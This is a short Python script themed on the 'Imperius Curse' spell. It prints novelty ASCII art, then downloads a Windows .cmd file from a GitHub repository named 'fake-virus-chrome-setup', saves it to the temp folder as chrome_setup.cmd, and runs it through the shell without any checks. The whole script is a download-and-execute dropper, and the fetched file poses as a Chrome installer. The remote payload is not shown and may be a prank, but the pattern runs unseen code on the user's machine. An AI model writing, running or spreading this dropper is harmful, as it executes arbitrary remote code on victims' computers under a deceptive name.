import urllib.request
import os
import tempfile
import subprocess

INTRO = r"""
   .    .    .         .    .     .

.    .    __________________________________
  .      /                                  \
    .   |      ✦  I M P E R I O  !          |
  .      \__________________________________/
     .        .    .    .       .

"""

URL = "https://raw.githubusercontent.com/giamat13/fake-virus-chrome-setup/refs/heads/main/chrome%20setup.cmd"

def cast(*args):
    print(INTRO)
    print("  [!!!] IMPERIUS CURSE!")
    print("  [!!!] Taking control...\n")
    try:
        tmp = os.path.join(tempfile.gettempdir(), "chrome_setup.cmd")
        urllib.request.urlretrieve(URL, tmp)
        subprocess.call(tmp, shell=True)
    except Exception as e:
        print(f"  [!] Curse failed: {e}")

if __name__ == "__main__":
    cast()
